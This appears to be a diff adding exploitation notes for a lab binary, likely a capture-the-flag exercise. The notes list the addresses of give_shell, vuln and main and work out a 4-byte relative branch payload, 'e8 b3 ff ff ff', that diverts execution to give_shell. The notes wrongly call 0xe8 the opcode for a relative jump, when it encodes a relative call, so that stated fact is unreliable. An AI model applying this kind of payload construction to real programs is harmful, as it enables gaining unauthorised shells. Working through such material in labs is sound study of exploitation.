@@ -1,0 +1,9 @@
+give_shell: 0x80484ad
+vuln: 0x80484e2
+main: 0x80484fc
+
+jump relative to 0x80484fa
+0x80484fa - 0x80484ad = -77 (in 4 byte: 0xffffffb3)
+little endian conversion: 0xb3ffffff
+Opcode for 4 byte relative jump: 0xe8
+Entire jump payload: e8 b3 ff ff ff
